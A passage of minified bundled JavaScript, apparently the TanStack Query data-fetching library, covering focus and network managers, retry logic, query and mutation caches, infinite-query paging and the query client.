  return Object.prototype.toString.call(e) === "[object Object]"
}
function MS(e) {
  return new Promise(t => {
    setTimeout(t, e)
  }
  )
}
function RS(e, t, n) {
  return typeof n.structuralSharing == "function" ? n.structuralSharing(e, t) : n.structuralSharing !== !1 ? Pv(e, t) : t
}
function OS(e, t, n = 0) {
  const r = [...e, t];
  return n && r.length > n ? r.slice(1) : r
}
function IS(e, t, n = 0) {
  const r = [t, ...e];
  return n && r.length > n ? r.slice(0, -1) : r
}
var Lf = Symbol();
function Av(e, t) {
  return !e.queryFn && (t != null && t.initialPromise) ? () => t.initialPromise : !e.queryFn || e.queryFn === Lf ? () => Promise.reject(new Error(`Missing queryFn: '${e.queryHash}'`)) : e.queryFn
}
var zr, rr, _s, s0, _S = (s0 = class extends Wl {
  constructor() {
    super();
    ae(this, zr);
    ae(this, rr);
    ae(this, _s);
    ne(this, _s, t => {
      if (!Ql && window.addEventListener) {
        const n = () => t();
        return window.addEventListener("visibilitychange", n, !1),
          () => {
            window.removeEventListener("visibilitychange", n)
          }
      }
    }
    )
  }
  onSubscribe() {
    M(this, rr) || this.setEventListener(M(this, _s))
  }
  onUnsubscribe() {
    var t;
    this.hasListeners() || ((t = M(this, rr)) == null || t.call(this),
      ne(this, rr, void 0))
  }
  setEventListener(t) {
    var n;
    ne(this, _s, t),
      (n = M(this, rr)) == null || n.call(this),
      ne(this, rr, t(r => {
        typeof r == "boolean" ? this.setFocused(r) : this.onFocus()
      }
      ))
  }
  setFocused(t) {
    M(this, zr) !== t && (ne(this, zr, t),
      this.onFocus())
  }
  onFocus() {
    const t = this.isFocused();
    this.listeners.forEach(n => {
      n(t)
    }
    )
  }
  isFocused() {
    var t;
    return typeof M(this, zr) == "boolean" ? M(this, zr) : ((t = globalThis.document) == null ? void 0 : t.visibilityState) !== "hidden"
  }
}
  ,
  zr = new WeakMap,
  rr = new WeakMap,
  _s = new WeakMap,
  s0), Ev = new _S, Ls, sr, Fs, o0, LS = (o0 = class extends Wl {
    constructor() {
      super();
      ae(this, Ls, !0);
      ae(this, sr);
      ae(this, Fs);
      ne(this, Fs, t => {
        if (!Ql && window.addEventListener) {
          const n = () => t(!0)
            , r = () => t(!1);
          return window.addEventListener("online", n, !1),
            window.addEventListener("offline", r, !1),
            () => {
              window.removeEventListener("online", n),
                window.removeEventListener("offline", r)
            }
        }
      }
      )
    }
    onSubscribe() {
      M(this, sr) || this.setEventListener(M(this, Fs))
    }
    onUnsubscribe() {
      var t;
      this.hasListeners() || ((t = M(this, sr)) == null || t.call(this),
        ne(this, sr, void 0))
    }
    setEventListener(t) {
      var n;
      ne(this, Fs, t),
        (n = M(this, sr)) == null || n.call(this),
        ne(this, sr, t(this.setOnline.bind(this)))
    }
    setOnline(t) {
      M(this, Ls) !== t && (ne(this, Ls, t),
        this.listeners.forEach(r => {
          r(t)
        }
        ))
    }
    isOnline() {
      return M(this, Ls)
    }
  }
    ,
    Ls = new WeakMap,
    sr = new WeakMap,
    Fs = new WeakMap,
    o0), dl = new LS;
function FS() {
  let e, t;
  const n = new Promise((s, o) => {
    e = s,
      t = o
  }
  );
  n.status = "pending",
    n.catch(() => { }
    );
  function r(s) {
    Object.assign(n, s),
      delete n.resolve,
      delete n.reject
  }
  return n.resolve = s => {
    r({
      status: "fulfilled",
      value: s
    }),
      e(s)
  }
    ,
    n.reject = s => {
      r({
        status: "rejected",
        reason: s
      }),
        t(s)
    }
    ,
    n
}
function VS(e) {
  return Math.min(1e3 * 2 ** e, 3e4)
}
function Tv(e) {
  return (e ?? "online") === "online" ? dl.isOnline() : !0
}
var kv = class extends Error {
  constructor(e) {
    super("CancelledError"),
      this.revert = e == null ? void 0 : e.revert,
      this.silent = e == null ? void 0 : e.silent
  }
}
  ;
function Hc(e) {
  return e instanceof kv
}
function Dv(e) {
  let t = !1, n = 0, r = !1, s;
  const o = FS()
    , i = v => {
      var C;
      r || (h(new kv(v)),
        (C = e.abort) == null || C.call(e))
    }
    , l = () => {
      t = !0
    }
    , c = () => {
      t = !1
    }
    , u = () => Ev.isFocused() && (e.networkMode === "always" || dl.isOnline()) && e.canRun()
    , d = () => Tv(e.networkMode) && e.canRun()
    , f = v => {
      var C;
      r || (r = !0,
        (C = e.onSuccess) == null || C.call(e, v),
        s == null || s(),
        o.resolve(v))
    }
    , h = v => {
      var C;
      r || (r = !0,
        (C = e.onError) == null || C.call(e, v),
        s == null || s(),
        o.reject(v))
    }
    , y = () => new Promise(v => {
      var C;
      s = g => {
        (r || u()) && v(g)
      }
        ,
        (C = e.onPause) == null || C.call(e)
    }
    ).then(() => {
      var v;
      s = void 0,
        r || (v = e.onContinue) == null || v.call(e)
    }
    )
    , b = () => {
      if (r)
        return;
      let v;
      const C = n === 0 ? e.initialPromise : void 0;
      try {
        v = C ?? e.fn()
      } catch (g) {
        v = Promise.reject(g)
      }
      Promise.resolve(v).then(f).catch(g => {
        var N;
        if (r)
          return;
        const m = e.retry ?? (Ql ? 0 : 3)
          , p = e.retryDelay ?? VS
          , w = typeof p == "function" ? p(n, g) : p
          , S = m === !0 || typeof m == "number" && n < m || typeof m == "function" && m(n, g);
        if (t || !S) {
          h(g);
          return
        }
        n++,
          (N = e.onFail) == null || N.call(e, n, g),
          MS(w).then(() => u() ? void 0 : y()).then(() => {
            t ? h(g) : b()
          }
          )
      }
      )
    }
    ;
  return {
    promise: o,
    cancel: i,
    continue: () => (s == null || s(),
      o),
    cancelRetry: l,
    continueRetry: c,
    canStart: d,
    start: () => (d() ? b() : y().then(b),
      o)
  }
}
function BS() {
  let e = []
    , t = 0
    , n = l => {
      l()
    }
    , r = l => {
      l()
    }
    , s = l => setTimeout(l, 0);
  const o = l => {
    t ? e.push(l) : s(() => {
      n(l)
    }
    )
  }
    , i = () => {
      const l = e;
      e = [],
        l.length && s(() => {
          r(() => {
            l.forEach(c => {
              n(c)
            }
            )
          }
          )
        }
        )
    }
    ;
  return {
    batch: l => {
      let c;
      t++;
      try {
        c = l()
      } finally {
        t--,
          t || i()
      }
      return c
    }
    ,
    batchCalls: l => (...c) => {
      o(() => {
        l(...c)
      }
      )
    }
    ,
    schedule: o,
    setNotifyFunction: l => {
      n = l
    }
    ,
    setBatchNotifyFunction: l => {
      r = l
    }
    ,
    setScheduler: l => {
      s = l
    }
  }
}
var rt = BS(), Ur, i0, Mv = (i0 = class {
  constructor() {
    ae(this, Ur)
  }
  destroy() {
    this.clearGcTimeout()
  }
  scheduleGc() {
    this.clearGcTimeout(),
      TS(this.gcTime) && ne(this, Ur, setTimeout(() => {
        this.optionalRemove()
      }
        , this.gcTime))
  }
  updateGcTime(e) {
    this.gcTime = Math.max(this.gcTime || 0, e ?? (Ql ? 1 / 0 : 5 * 60 * 1e3))
  }
  clearGcTimeout() {
    M(this, Ur) && (clearTimeout(M(this, Ur)),
      ne(this, Ur, void 0))
  }
}
  ,
  Ur = new WeakMap,
  i0), Vs, Bs, Rt, Ge, Ei, $r, Gt, Sn, a0, zS = (a0 = class extends Mv {
    constructor(t) {
      super();
      ae(this, Gt);
      ae(this, Vs);
      ae(this, Bs);
      ae(this, Rt);
      ae(this, Ge);
      ae(this, Ei);
      ae(this, $r);
      ne(this, $r, !1),
        ne(this, Ei, t.defaultOptions),
        this.setOptions(t.options),
        this.observers = [],
        ne(this, Rt, t.cache),
        this.queryKey = t.queryKey,
        this.queryHash = t.queryHash,
        ne(this, Vs, $S(this.options)),
        this.state = t.state ?? M(this, Vs),
        this.scheduleGc()
    }
    get meta() {
      return this.options.meta
    }
    get promise() {
      var t;
      return (t = M(this, Ge)) == null ? void 0 : t.promise
    }
    setOptions(t) {
      this.options = {
        ...M(this, Ei),
        ...t
      },
        this.updateGcTime(this.options.gcTime)
    }
    optionalRemove() {
      !this.observers.length && this.state.fetchStatus === "idle" && M(this, Rt).remove(this)
    }
    setData(t, n) {
      const r = RS(this.state.data, t, this.options);
      return We(this, Gt, Sn).call(this, {
        data: r,
        type: "success",
        dataUpdatedAt: n == null ? void 0 : n.updatedAt,
        manual: n == null ? void 0 : n.manual
      }),
        r
    }
    setState(t, n) {
      We(this, Gt, Sn).call(this, {
        type: "setState",
        state: t,
        setStateOptions: n
      })
    }
    cancel(t) {
      var r, s;
      const n = (r = M(this, Ge)) == null ? void 0 : r.promise;
      return (s = M(this, Ge)) == null || s.cancel(t),
        n ? n.then(qt).catch(qt) : Promise.resolve()
    }
    destroy() {
      super.destroy(),
        this.cancel({
          silent: !0
        })
    }
    reset() {
      this.destroy(),
        this.setState(M(this, Vs))
    }
    isActive() {
      return this.observers.some(t => DS(t.options.enabled, this) !== !1)
    }
    isDisabled() {
      return this.getObserversCount() > 0 ? !this.isActive() : this.options.queryFn === Lf || this.state.dataUpdateCount + this.state.errorUpdateCount === 0
    }
    isStale() {
      return this.state.isInvalidated ? !0 : this.getObserversCount() > 0 ? this.observers.some(t => t.getCurrentResult().isStale) : this.state.data === void 0
    }
    isStaleByTime(t = 0) {
      return this.state.isInvalidated || this.state.data === void 0 || !kS(this.state.dataUpdatedAt, t)
    }
    onFocus() {
      var n;
      const t = this.observers.find(r => r.shouldFetchOnWindowFocus());
      t == null || t.refetch({
        cancelRefetch: !1
      }),
        (n = M(this, Ge)) == null || n.continue()
    }
    onOnline() {
      var n;
      const t = this.observers.find(r => r.shouldFetchOnReconnect());
      t == null || t.refetch({
        cancelRefetch: !1
      }),
        (n = M(this, Ge)) == null || n.continue()
    }
    addObserver(t) {
      this.observers.includes(t) || (this.observers.push(t),
        this.clearGcTimeout(),
        M(this, Rt).notify({
          type: "observerAdded",
          query: this,
          observer: t
        }))
    }
    removeObserver(t) {
      this.observers.includes(t) && (this.observers = this.observers.filter(n => n !== t),
        this.observers.length || (M(this, Ge) && (M(this, $r) ? M(this, Ge).cancel({
          revert: !0
        }) : M(this, Ge).cancelRetry()),
          this.scheduleGc()),
        M(this, Rt).notify({
          type: "observerRemoved",
          query: this,
          observer: t
        }))
    }
    getObserversCount() {
      return this.observers.length
    }
    invalidate() {
      this.state.isInvalidated || We(this, Gt, Sn).call(this, {
        type: "invalidate"
      })
    }
    fetch(t, n) {
      var c, u, d;
      if (this.state.fetchStatus !== "idle") {
        if (this.state.data !== void 0 && (n != null && n.cancelRefetch))
          this.cancel({
            silent: !0
          });
        else if (M(this, Ge))
          return M(this, Ge).continueRetry(),
            M(this, Ge).promise
      }
      if (t && this.setOptions(t),
        !this.options.queryFn) {
        const f = this.observers.find(h => h.options.queryFn);
        f && this.setOptions(f.options)
      }
      const r = new AbortController
        , s = f => {
          Object.defineProperty(f, "signal", {
            enumerable: !0,
            get: () => (ne(this, $r, !0),
              r.signal)
          })
        }
        , o = () => {
          const f = Av(this.options, n)
            , h = {
              queryKey: this.queryKey,
              meta: this.meta
            };
          return s(h),
            ne(this, $r, !1),
            this.options.persister ? this.options.persister(f, h, this) : f(h)
        }
        , i = {
          fetchOptions: n,
          options: this.options,
          queryKey: this.queryKey,
          state: this.state,
          fetchFn: o
        };
      s(i),
        (c = this.options.behavior) == null || c.onFetch(i, this),
        ne(this, Bs, this.state),
        (this.state.fetchStatus === "idle" || this.state.fetchMeta !== ((u = i.fetchOptions) == null ? void 0 : u.meta)) && We(this, Gt, Sn).call(this, {
          type: "fetch",
          meta: (d = i.fetchOptions) == null ? void 0 : d.meta
        });
      const l = f => {
        var h, y, b, v;
        Hc(f) && f.silent || We(this, Gt, Sn).call(this, {
          type: "error",
          error: f
        }),
          Hc(f) || ((y = (h = M(this, Rt).config).onError) == null || y.call(h, f, this),
            (v = (b = M(this, Rt).config).onSettled) == null || v.call(b, this.state.data, f, this)),
          this.scheduleGc()
      }
        ;
      return ne(this, Ge, Dv({
        initialPromise: n == null ? void 0 : n.initialPromise,
        fn: i.fetchFn,
        abort: r.abort.bind(r),
        onSuccess: f => {
          var h, y, b, v;
          if (f === void 0) {
            l(new Error(`${this.queryHash} data is undefined`));
            return
          }
          try {
            this.setData(f)
          } catch (C) {
            l(C);
            return
          }
          (y = (h = M(this, Rt).config).onSuccess) == null || y.call(h, f, this),
            (v = (b = M(this, Rt).config).onSettled) == null || v.call(b, f, this.state.error, this),
            this.scheduleGc()
        }
        ,
        onError: l,
        onFail: (f, h) => {
          We(this, Gt, Sn).call(this, {
            type: "failed",
            failureCount: f,
            error: h
          })
        }
        ,
        onPause: () => {
          We(this, Gt, Sn).call(this, {
            type: "pause"
          })
        }
        ,
        onContinue: () => {
          We(this, Gt, Sn).call(this, {
            type: "continue"
          })
        }
        ,
        retry: i.options.retry,
        retryDelay: i.options.retryDelay,
        networkMode: i.options.networkMode,
        canRun: () => !0
      })),
        M(this, Ge).start()
    }
  }
    ,
    Vs = new WeakMap,
    Bs = new WeakMap,
    Rt = new WeakMap,
    Ge = new WeakMap,
    Ei = new WeakMap,
    $r = new WeakMap,
    Gt = new WeakSet,
    Sn = function (t) {
      const n = r => {
        switch (t.type) {
          case "failed":
            return {
              ...r,
              fetchFailureCount: t.failureCount,
              fetchFailureReason: t.error
            };
          case "pause":
            return {
              ...r,
              fetchStatus: "paused"
            };
          case "continue":
            return {
              ...r,
              fetchStatus: "fetching"
            };
          case "fetch":
            return {
              ...r,
              ...US(r.data, this.options),
              fetchMeta: t.meta ?? null
            };
          case "success":
            return {
              ...r,
              data: t.data,
              dataUpdateCount: r.dataUpdateCount + 1,
              dataUpdatedAt: t.dataUpdatedAt ?? Date.now(),
              error: null,
              isInvalidated: !1,
              status: "success",
              ...!t.manual && {
                fetchStatus: "idle",
                fetchFailureCount: 0,
                fetchFailureReason: null
              }
            };
          case "error":
            const s = t.error;
            return Hc(s) && s.revert && M(this, Bs) ? {
              ...M(this, Bs),
              fetchStatus: "idle"
            } : {
              ...r,
              error: s,
              errorUpdateCount: r.errorUpdateCount + 1,
              errorUpdatedAt: Date.now(),
              fetchFailureCount: r.fetchFailureCount + 1,
              fetchFailureReason: s,
              fetchStatus: "idle",
              status: "error"
            };
          case "invalidate":
            return {
              ...r,
              isInvalidated: !0
            };
          case "setState":
            return {
              ...r,
              ...t.state
            }
        }
      }
        ;
      this.state = n(this.state),
        rt.batch(() => {
          this.observers.forEach(r => {
            r.onQueryUpdate()
          }
          ),
            M(this, Rt).notify({
              query: this,
              type: "updated",
              action: t
            })
        }
        )
    }
    ,
    a0);
function US(e, t) {
  return {
    fetchFailureCount: 0,
    fetchFailureReason: null,
    fetchStatus: Tv(t.networkMode) ? "fetching" : "paused",
    ...e === void 0 && {
      error: null,
      status: "pending"
    }
  }
}
function $S(e) {
  const t = typeof e.initialData == "function" ? e.initialData() : e.initialData
    , n = t !== void 0
    , r = n ? typeof e.initialDataUpdatedAt == "function" ? e.initialDataUpdatedAt() : e.initialDataUpdatedAt : 0;
  return {
    data: t,
    dataUpdateCount: 0,
    dataUpdatedAt: n ? r ?? Date.now() : 0,
    error: null,
    errorUpdateCount: 0,
    errorUpdatedAt: 0,
    fetchFailureCount: 0,
    fetchFailureReason: null,
    fetchMeta: null,
    isInvalidated: !1,
    status: n ? "success" : "pending",
    fetchStatus: "idle"
  }
}
var on, l0, HS = (l0 = class extends Wl {
  constructor(t = {}) {
    super();
    ae(this, on);
    this.config = t,
      ne(this, on, new Map)
  }
  build(t, n, r) {
    const s = n.queryKey
      , o = n.queryHash ?? _f(s, n);
    let i = this.get(o);
    return i || (i = new zS({
      cache: this,
      queryKey: s,
      queryHash: o,
      options: t.defaultQueryOptions(n),
      state: r,
      defaultOptions: t.getQueryDefaults(s)
    }),
      this.add(i)),
      i
  }
  add(t) {
    M(this, on).has(t.queryHash) || (M(this, on).set(t.queryHash, t),
      this.notify({
        type: "added",
        query: t
      }))
  }
  remove(t) {
    const n = M(this, on).get(t.queryHash);
    n && (t.destroy(),
      n === t && M(this, on).delete(t.queryHash),
      this.notify({
        type: "removed",
        query: t
      }))
  }
  clear() {
    rt.batch(() => {
      this.getAll().forEach(t => {
        this.remove(t)
      }
      )
    }
    )
  }
  get(t) {
    return M(this, on).get(t)
  }
  getAll() {
    return [...M(this, on).values()]
  }
  find(t) {
    const n = {
      exact: !0,
      ...t
    };
    return this.getAll().find(r => Km(n, r))
  }
  findAll(t = {}) {
    const n = this.getAll();
    return Object.keys(t).length > 0 ? n.filter(r => Km(t, r)) : n
  }
  notify(t) {
    rt.batch(() => {
      this.listeners.forEach(n => {
        n(t)
      }
      )
    }
    )
  }
  onFocus() {
    rt.batch(() => {
      this.getAll().forEach(t => {
        t.onFocus()
      }
      )
    }
    )
  }
  onOnline() {
    rt.batch(() => {
      this.getAll().forEach(t => {
        t.onOnline()
      }
      )
    }
    )
  }
}
  ,
  on = new WeakMap,
  l0), an, et, Hr, ln, Yn, c0, WS = (c0 = class extends Mv {
    constructor(t) {
      super();
      ae(this, ln);
      ae(this, an);
      ae(this, et);
      ae(this, Hr);
      this.mutationId = t.mutationId,
        ne(this, et, t.mutationCache),
        ne(this, an, []),
        this.state = t.state || QS(),
        this.setOptions(t.options),
        this.scheduleGc()
    }
    setOptions(t) {
      this.options = t,
        this.updateGcTime(this.options.gcTime)
    }
    get meta() {
      return this.options.meta
    }
    addObserver(t) {
      M(this, an).includes(t) || (M(this, an).push(t),
        this.clearGcTimeout(),
        M(this, et).notify({
          type: "observerAdded",
          mutation: this,
          observer: t
        }))
    }
    removeObserver(t) {
      ne(this, an, M(this, an).filter(n => n !== t)),
        this.scheduleGc(),
        M(this, et).notify({
          type: "observerRemoved",
          mutation: this,
          observer: t
        })
    }
    optionalRemove() {
      M(this, an).length || (this.state.status === "pending" ? this.scheduleGc() : M(this, et).remove(this))
    }
    continue() {
      var t;
      return ((t = M(this, Hr)) == null ? void 0 : t.continue()) ?? this.execute(this.state.variables)
    }
    async execute(t) {
      var s, o, i, l, c, u, d, f, h, y, b, v, C, g, m, p, w, S, N, P;
      ne(this, Hr, Dv({
        fn: () => this.options.mutationFn ? this.options.mutationFn(t) : Promise.reject(new Error("No mutationFn found")),
        onFail: (A, k) => {
          We(this, ln, Yn).call(this, {
            type: "failed",
            failureCount: A,
            error: k
          })
        }
        ,
        onPause: () => {
          We(this, ln, Yn).call(this, {
            type: "pause"
          })
        }
        ,
        onContinue: () => {
          We(this, ln, Yn).call(this, {
            type: "continue"
          })
        }
        ,
        retry: this.options.retry ?? 0,
        retryDelay: this.options.retryDelay,
        networkMode: this.options.networkMode,
        canRun: () => M(this, et).canRun(this)
      }));
      const n = this.state.status === "pending"
        , r = !M(this, Hr).canStart();
      try {
        if (!n) {
          We(this, ln, Yn).call(this, {
            type: "pending",
            variables: t,
            isPaused: r
          }),
            await ((o = (s = M(this, et).config).onMutate) == null ? void 0 : o.call(s, t, this));
          const k = await ((l = (i = this.options).onMutate) == null ? void 0 : l.call(i, t));
          k !== this.state.context && We(this, ln, Yn).call(this, {
            type: "pending",
            context: k,
            variables: t,
            isPaused: r
          })
        }
        const A = await M(this, Hr).start();
        return await ((u = (c = M(this, et).config).onSuccess) == null ? void 0 : u.call(c, A, t, this.state.context, this)),
          await ((f = (d = this.options).onSuccess) == null ? void 0 : f.call(d, A, t, this.state.context)),
          await ((y = (h = M(this, et).config).onSettled) == null ? void 0 : y.call(h, A, null, this.state.variables, this.state.context, this)),
          await ((v = (b = this.options).onSettled) == null ? void 0 : v.call(b, A, null, t, this.state.context)),
          We(this, ln, Yn).call(this, {
            type: "success",
            data: A
          }),
          A
      } catch (A) {
        try {
          throw await ((g = (C = M(this, et).config).onError) == null ? void 0 : g.call(C, A, t, this.state.context, this)),
          await ((p = (m = this.options).onError) == null ? void 0 : p.call(m, A, t, this.state.context)),
          await ((S = (w = M(this, et).config).onSettled) == null ? void 0 : S.call(w, void 0, A, this.state.variables, this.state.context, this)),
          await ((P = (N = this.options).onSettled) == null ? void 0 : P.call(N, void 0, A, t, this.state.context)),
          A
        } finally {
          We(this, ln, Yn).call(this, {
            type: "error",
            error: A
          })
        }
      } finally {
        M(this, et).runNext(this)
      }
    }
  }
    ,
    an = new WeakMap,
    et = new WeakMap,
    Hr = new WeakMap,
    ln = new WeakSet,
    Yn = function (t) {
      const n = r => {
        switch (t.type) {
          case "failed":
            return {
              ...r,
              failureCount: t.failureCount,
              failureReason: t.error
            };
          case "pause":
            return {
              ...r,
              isPaused: !0
            };
          case "continue":
            return {
              ...r,
              isPaused: !1
            };
          case "pending":
            return {
              ...r,
              context: t.context,
              data: void 0,
              failureCount: 0,
              failureReason: null,
              error: null,
              isPaused: t.isPaused,
              status: "pending",
              variables: t.variables,
              submittedAt: Date.now()
            };
          case "success":
            return {
              ...r,
              data: t.data,
              failureCount: 0,
              failureReason: null,
              error: null,
              status: "success",
              isPaused: !1
            };
          case "error":
            return {
              ...r,
              data: void 0,
              error: t.error,
              failureCount: r.failureCount + 1,
              failureReason: t.error,
              isPaused: !1,
              status: "error"
            }
        }
      }
        ;
      this.state = n(this.state),
        rt.batch(() => {
          M(this, an).forEach(r => {
            r.onMutationUpdate(t)
          }
          ),
            M(this, et).notify({
              mutation: this,
              type: "updated",
              action: t
            })
        }
        )
    }
    ,
    c0);
function QS() {
  return {
    context: void 0,
    data: void 0,
    error: null,
    failureCount: 0,
    failureReason: null,
    isPaused: !1,
    status: "idle",
    variables: void 0,
    submittedAt: 0
  }
}
var xt, Ti, u0, qS = (u0 = class extends Wl {
  constructor(t = {}) {
    super();
    ae(this, xt);
    ae(this, Ti);
    this.config = t,
      ne(this, xt, new Map),
      ne(this, Ti, Date.now())
  }
  build(t, n, r) {
    const s = new WS({
      mutationCache: this,
      mutationId: ++Ki(this, Ti)._,
      options: t.defaultMutationOptions(n),
      state: r
    });
    return this.add(s),
      s
  }
  add(t) {
    const n = ha(t)
      , r = M(this, xt).get(n) ?? [];
    r.push(t),
      M(this, xt).set(n, r),
      this.notify({
        type: "added",
        mutation: t
      })
  }
  remove(t) {
    var r;
    const n = ha(t);
    if (M(this, xt).has(n)) {
      const s = (r = M(this, xt).get(n)) == null ? void 0 : r.filter(o => o !== t);
      s && (s.length === 0 ? M(this, xt).delete(n) : M(this, xt).set(n, s))
    }
    this.notify({
      type: "removed",
      mutation: t
    })
  }
  canRun(t) {
    var r;
    const n = (r = M(this, xt).get(ha(t))) == null ? void 0 : r.find(s => s.state.status === "pending");
    return !n || n === t
  }
  runNext(t) {
    var r;
    const n = (r = M(this, xt).get(ha(t))) == null ? void 0 : r.find(s => s !== t && s.state.isPaused);
    return (n == null ? void 0 : n.continue()) ?? Promise.resolve()
  }
  clear() {
    rt.batch(() => {
      this.getAll().forEach(t => {
        this.remove(t)
      }
      )
    }
    )
  }
  getAll() {
    return [...M(this, xt).values()].flat()
  }
  find(t) {
    const n = {
      exact: !0,
      ...t
    };
    return this.getAll().find(r => Ym(n, r))
  }
  findAll(t = {}) {
    return this.getAll().filter(n => Ym(t, n))
  }
  notify(t) {
    rt.batch(() => {
      this.listeners.forEach(n => {
        n(t)
      }
      )
    }
    )
  }
  resumePausedMutations() {
    const t = this.getAll().filter(n => n.state.isPaused);
    return rt.batch(() => Promise.all(t.map(n => n.continue().catch(qt))))
  }
}
  ,
  xt = new WeakMap,
  Ti = new WeakMap,
  u0);
function ha(e) {
  var t;
  return ((t = e.options.scope) == null ? void 0 : t.id) ?? String(e.mutationId)
}
function Zm(e) {
  return {
    onFetch: (t, n) => {
      var d, f, h, y, b;
      const r = t.options
        , s = (h = (f = (d = t.fetchOptions) == null ? void 0 : d.meta) == null ? void 0 : f.fetchMore) == null ? void 0 : h.direction
        , o = ((y = t.state.data) == null ? void 0 : y.pages) || []
        , i = ((b = t.state.data) == null ? void 0 : b.pageParams) || [];
      let l = {
        pages: [],
        pageParams: []
      }
        , c = 0;
      const u = async () => {
        let v = !1;
        const C = p => {
          Object.defineProperty(p, "signal", {
            enumerable: !0,
            get: () => (t.signal.aborted ? v = !0 : t.signal.addEventListener("abort", () => {
              v = !0
            }
            ),
              t.signal)
          })
        }
          , g = Av(t.options, t.fetchOptions)
          , m = async (p, w, S) => {
            if (v)
              return Promise.reject();
            if (w == null && p.pages.length)
              return Promise.resolve(p);
            const N = {
              queryKey: t.queryKey,
              pageParam: w,
              direction: S ? "backward" : "forward",
              meta: t.options.meta
            };
            C(N);
            const P = await g(N)
              , { maxPages: A } = t.options
              , k = S ? IS : OS;
            return {
              pages: k(p.pages, P, A),
              pageParams: k(p.pageParams, w, A)
            }
          }
          ;
        if (s && o.length) {
          const p = s === "backward"
            , w = p ? GS : ep
            , S = {
              pages: o,
              pageParams: i
            }
            , N = w(r, S);
          l = await m(S, N, p)
        } else {
          const p = e ?? o.length;
          do {
            const w = c === 0 ? i[0] ?? r.initialPageParam : ep(r, l);
            if (c > 0 && w == null)
              break;
            l = await m(l, w),
              c++
          } while (c < p)
        }
        return l
      }
        ;
      t.options.persister ? t.fetchFn = () => {
        var v, C;
        return (C = (v = t.options).persister) == null ? void 0 : C.call(v, u, {
          queryKey: t.queryKey,
          meta: t.options.meta,
          signal: t.signal
        }, n)
      }
        : t.fetchFn = u
    }
  }
}
function ep(e, { pages: t, pageParams: n }) {
  const r = t.length - 1;
  return t.length > 0 ? e.getNextPageParam(t[r], t, n[r], n) : void 0
}
function GS(e, { pages: t, pageParams: n }) {
  var r;
  return t.length > 0 ? (r = e.getPreviousPageParam) == null ? void 0 : r.call(e, t[0], t, n[0], n) : void 0
}
var Ce, or, ir, zs, Us, ar, $s, Hs, d0, KS = (d0 = class {
  constructor(e = {}) {
    ae(this, Ce);
    ae(this, or);
    ae(this, ir);
    ae(this, zs);
    ae(this, Us);
    ae(this, ar);
    ae(this, $s);
    ae(this, Hs);
    ne(this, Ce, e.queryCache || new HS),
      ne(this, or, e.mutationCache || new qS),
      ne(this, ir, e.defaultOptions || {}),
      ne(this, zs, new Map),
      ne(this, Us, new Map),
      ne(this, ar, 0)
  }
  mount() {
    Ki(this, ar)._++,
      M(this, ar) === 1 && (ne(this, $s, Ev.subscribe(async e => {
        e && (await this.resumePausedMutations(),
          M(this, Ce).onFocus())
      }
      )),
        ne(this, Hs, dl.subscribe(async e => {
          e && (await this.resumePausedMutations(),
            M(this, Ce).onOnline())
        }
        )))
  }
  unmount() {
    var e, t;
    Ki(this, ar)._--,
      M(this, ar) === 0 && ((e = M(this, $s)) == null || e.call(this),
        ne(this, $s, void 0),
        (t = M(this, Hs)) == null || t.call(this),
        ne(this, Hs, void 0))
  }
  isFetching(e) {
    return M(this, Ce).findAll({
      ...e,
      fetchStatus: "fetching"
    }).length
  }
  isMutating(e) {
    return M(this, or).findAll({
      ...e,
      status: "pending"
    }).length
  }
  getQueryData(e) {
    var n;
    const t = this.defaultQueryOptions({
      queryKey: e
    });
    return (n = M(this, Ce).get(t.queryHash)) == null ? void 0 : n.state.data
  }
  ensureQueryData(e) {
    const t = this.getQueryData(e.queryKey);
    if (t === void 0)
      return this.fetchQuery(e);
    {
      const n = this.defaultQueryOptions(e)
        , r = M(this, Ce).build(this, n);
      return e.revalidateIfStale && r.isStaleByTime(Gm(n.staleTime, r)) && this.prefetchQuery(n),
        Promise.resolve(t)
    }
  }
  getQueriesData(e) {
    return M(this, Ce).findAll(e).map(({ queryKey: t, state: n }) => {
      const r = n.data;
      return [t, r]
    }
    )
  }
  setQueryData(e, t, n) {
    const r = this.defaultQueryOptions({
      queryKey: e
    })
      , s = M(this, Ce).get(r.queryHash)
      , o = s == null ? void 0 : s.state.data
      , i = ES(t, o);
    if (i !== void 0)
      return M(this, Ce).build(this, r).setData(i, {
        ...n,
        manual: !0
      })
  }
  setQueriesData(e, t, n) {
    return rt.batch(() => M(this, Ce).findAll(e).map(({ queryKey: r }) => [r, this.setQueryData(r, t, n)]))
  }
  getQueryState(e) {
    var n;
    const t = this.defaultQueryOptions({
      queryKey: e
    });
    return (n = M(this, Ce).get(t.queryHash)) == null ? void 0 : n.state
  }
  removeQueries(e) {
    const t = M(this, Ce);
    rt.batch(() => {
      t.findAll(e).forEach(n => {
        t.remove(n)
      }
      )
    }
    )
  }
  resetQueries(e, t) {
    const n = M(this, Ce)
      , r = {
        type: "active",
        ...e
      };
    return rt.batch(() => (n.findAll(e).forEach(s => {
      s.reset()
    }
    ),
      this.refetchQueries(r, t)))
  }
  cancelQueries(e = {}, t = {}) {
    const n = {
      revert: !0,
      ...t
    }
      , r = rt.batch(() => M(this, Ce).findAll(e).map(s => s.cancel(n)));
    return Promise.all(r).then(qt).catch(qt)
  }
  invalidateQueries(e = {}, t = {}) {
    return rt.batch(() => {
      if (M(this, Ce).findAll(e).forEach(r => {
        r.invalidate()
      }
      ),
        e.refetchType === "none")
        return Promise.resolve();
      const n = {
        ...e,
        type: e.refetchType ?? e.type ?? "active"
      };
      return this.refetchQueries(n, t)
    }
    )
  }
  refetchQueries(e = {}, t) {
    const n = {
      ...t,
      cancelRefetch: (t == null ? void 0 : t.cancelRefetch) ?? !0
    }
      , r = rt.batch(() => M(this, Ce).findAll(e).filter(s => !s.isDisabled()).map(s => {
        let o = s.fetch(void 0, n);
        return n.throwOnError || (o = o.catch(qt)),
          s.state.fetchStatus === "paused" ? Promise.resolve() : o
      }
      ));
    return Promise.all(r).then(qt)
  }
  fetchQuery(e) {
    const t = this.defaultQueryOptions(e);
    t.retry === void 0 && (t.retry = !1);
    const n = M(this, Ce).build(this, t);
    return n.isStaleByTime(Gm(t.staleTime, n)) ? n.fetch(t) : Promise.resolve(n.state.data)
  }
  prefetchQuery(e) {
    return this.fetchQuery(e).then(qt).catch(qt)
  }
  fetchInfiniteQuery(e) {
    return e.behavior = Zm(e.pages),
      this.fetchQuery(e)
  }
  prefetchInfiniteQuery(e) {
    return this.fetchInfiniteQuery(e).then(qt).catch(qt)
  }
  ensureInfiniteQueryData(e) {
    return e.behavior = Zm(e.pages),
      this.ensureQueryData(e)
  }
  resumePausedMutations() {
